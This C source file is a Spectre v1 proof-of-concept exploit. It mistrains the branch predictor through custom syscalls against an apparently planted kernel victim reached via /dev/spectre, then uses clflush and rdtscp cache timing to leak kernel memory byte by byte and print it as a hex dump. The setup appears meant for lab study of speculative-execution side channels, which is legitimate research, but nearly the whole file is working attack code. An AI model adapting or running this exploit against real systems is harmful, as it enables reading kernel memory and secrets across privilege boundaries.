#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sched.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <x86intrin.h> /* for rdtscp and clflush */
#include "utils.h"

/********************************************************************
 Victim code.
 ********************************************************************/
#define OFFSET 4096

/********************************************************************
 Analysis code
 ********************************************************************/
#define CACHE_HIT_THRESHOLD (120) /* assume cache hit if time <= threshold */
uint8_t *array2 = NULL;
static unsigned int array1_size = 16;

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
{
    static int results[256];
    int tries, i, j, k, mix_i, junk = 0;
    size_t training_x, x;
    register uint64_t time1, time2;
    volatile uint8_t *addr;

    for (i = 0; i < 256; i++)
        results[i] = 0;
    for (tries = 15; tries > 0; tries--)
    {

        /* Flush array2[256*(0..255)] from cache */
        for (i = 0; i < 256; i++)
            _mm_clflush(&array2[i * OFFSET]); /* intrinsic for clflush instruction */

        /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
        training_x = tries % array1_size;
        for (j = 30; j >= 0; j--)
        {
            /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
            /* Avoid jumps in case those tip off the branch predictor */
            x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
            x = (x | (x >> 16));         /* Set x=-1 if j&6=0, else x=0 */
            x = training_x ^ (x & (malicious_x ^ training_x));

            /* Call the victim! */
            syscall(333, x);
        }

        /* Time reads. Order is lightly mixed up to prevent stride prediction */
        for (i = 0; i < 256; i++)
        {
            mix_i = ((i * 167) + 13) & 255;
            addr = &array2[mix_i * OFFSET];
            time1 = __rdtscp(&junk);         /* READ TIMER */
            junk = *addr;                    /* MEMORY ACCESS TO TIME */
            time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
            if (time2 <= CACHE_HIT_THRESHOLD)
                results[mix_i]++; /* cache hit - add +1 to score for this value */
        }

        /* Locate highest & second-highest results results tallies in j/k */
        j = k = -1;
        for (i = 0; i < 256; i++)
        {
            if (j < 0 || results[i] >= results[j])
            {
                k = j;
                j = i;
            }
            else if (k < 0 || results[i] >= results[k])
            {
                k = i;
            }
        }
        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
            break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
    }
    results[0] ^= junk; /* use junk so code above won’t get optimized out*/
    value[0] = (uint8_t)j;
    score[0] = results[j];
    value[1] = (uint8_t)k;
    score[1] = results[k];
}

int main(int argc, const char **argv)
{
    if (argc < 3)
    {
        printf("Usage: %s <paddr> <size> [kaslr_offset]\n", argv[0]);
        return 0;
    }

    size_t paddr = strtoull(argv[1], NULL, 0);
    size_t size = strtoull(argv[2], NULL, 0);
    size_t kaslr_offset = DEFAULT_PHYSICAL_OFFSET;
    if (argc >= 4)
    {
        size_t offset = strtoull(argv[3], NULL, 0);
        if (offset > 0)
            kaslr_offset = offset;
    }
    print(INFO, "Providing kaslr offset: 0x%zx\n", kaslr_offset);

    size_t vaddr = phys_to_virt(paddr, kaslr_offset);

    int fd = open("/dev/spectre", O_RDWR);
    if (fd < 0)
    {
        perror("Open device failed");
        return -1;
    }
    array2 = mmap(NULL, 256 * OFFSET, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (array2 == MAP_FAILED)
    {
        perror("mmap operation failed");
        return -1;
    }

    print(INFO, "Reading virtual address: 0x%zx\n", vaddr);
    size_t arr1_kvaddr = syscall(334, 1);
    size_t malicious_x = vaddr - (size_t)arr1_kvaddr;
    int i, score[2], len = size;
    uint8_t value[2];

    for (i = 0; i < sizeof(array2); i++)
        array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */

    int width = 16;
    if (width > len)
        width = len;
    char buffer[width];

    print(INFO, "Reading %d bytes:\n", len);
    struct timespec vartime = timer_start();
    for (int i = 0; i < len; ++i, ++malicious_x)
    {
        for (int k = 0; k < 3; ++k)
        {
            readMemoryByte(malicious_x, value, score);
            buffer[i % width] = value[0];
            if (value[0])
                break;
        }

        if ((i + 1) % width == 0)
        {
            printf("0x%10zx: ", malicious_x - (width - 1) + arr1_kvaddr);
            printf("| ");
            for (int k = 0; k < width; k++)
            {
                printf("%02x ", (unsigned char)buffer[k]);
            }
            printf("| ");
            for (int k = 0; k < width; k++)
            {
                printf("%c", (buffer[k] >= 32 && buffer[k] <= 126) ? buffer[k] : '.');
            }
            printf(" |\n");
        }
    }
    long time_elapsed_nanos = timer_end(vartime);
    print(SUCCESS, "Read %d bytes in %lf ms\n", len, (double)time_elapsed_nanos / 1e6);
    if (munmap(array2, 256 * OFFSET) == -1)
    {
        perror("Error un-mmapping the file");
    }
    close(fd);
    return (0);
}